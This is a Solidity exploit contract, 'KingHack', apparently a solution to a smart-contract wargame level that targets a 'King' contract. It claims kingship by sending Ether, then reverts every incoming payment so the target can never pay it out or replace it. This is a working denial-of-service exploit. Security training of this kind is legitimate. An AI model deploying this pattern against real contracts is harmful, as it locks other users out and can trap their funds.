// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './King.sol';

contract KingHack {
  King public king;
  address public owner;

  constructor(address _kingContract) public payable {
    king = King(payable(address(_kingContract)));
    owner = payable(address(msg.sender));
  }


  // Send msg.value to king to become new king, must be greater than current prize
  function becomeKing() public payable {

    (bool sent, ) = payable(address(king)).call{value: msg.value}("");
    require(sent, 'Failed to become king');

  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
  // When King contract pays us out will pay here, but we will
  // revert, maintaining our king title
  receive() external payable {
    revert("NO WAY SUCKA");
  }
}